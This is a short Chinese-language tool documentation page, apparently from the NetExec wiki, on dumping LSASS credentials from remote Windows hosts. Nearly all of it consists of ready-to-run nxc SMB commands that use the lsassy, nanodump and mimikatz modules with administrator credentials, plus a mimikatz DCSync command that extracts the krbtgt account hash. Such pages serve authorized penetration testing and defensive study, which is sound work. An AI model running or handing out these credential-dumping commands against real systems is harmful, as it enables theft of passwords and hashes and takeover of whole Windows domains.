# 导出 LSASS

{% hint style="warning" %}
你需要在远程目标上至少具有本地管理员权限，如果你的用户是本地账户，请使用 **--local-auth** 选项
{% endhint %}

### 使用 Lsassy

使用 [@pixis](https://twitter.com/HackAndDo) 的 Lsassy 模块，你可以远程导出凭证

```
#~ nxc smb 192.168.255.131 -u administrator -p pass -M lsassy
```

### 使用 nanodump

使用 nanodump 模块你可以远程导出凭证

```
#~ nxc smb 192.168.255.131 -u administrator -p pass -M nanodump
```

### 使用 Mimikatz (已弃用)

{% hint style="warning" %}
你需要在远程目标上至少具有本地管理员权限，如果你的用户是本地账户，请使用 **--local-auth** 选项
{% endhint %}

使用 Mimikatz 模块，将在远程目标上执行 `Invoke-Mimikatz.ps1` PowerShell 脚本

```
#~ nxc smb 192.168.255.131 -u administrator -p pass -M mimikatz
```

```
#~ nxc smb 192.168.255.131 -u Administrator -p pass -M mimikatz -o COMMAND='"lsadump::dcsync /domain:domain.local /user:krbtgt"
```
